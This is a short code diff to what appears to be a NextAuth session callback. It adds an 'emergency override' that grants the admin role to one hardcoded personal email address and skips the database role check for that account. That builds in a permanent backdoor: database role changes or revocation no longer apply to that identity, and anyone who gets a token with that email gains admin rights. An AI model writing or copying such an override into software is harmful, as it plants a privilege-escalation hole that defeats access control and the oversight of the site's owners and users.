@@ -64,8 +64,11 @@ export const authOptions = {
         token.email = user.email;
       } 
       
-      // Step 2: On every session check, ensure we have the latest role from DB
-      if (token.email) {
+      // Step 2: Emergency override for primary administrator
+      if (token.email === 'jisunahamed525@gmail.com') {
+        token.role = 'admin';
+      } else if (token.email) {
+        // Real-time role check for others
         const dbUser = await prisma.user.findUnique({
           where: { email: token.email },
           select: { role: true }
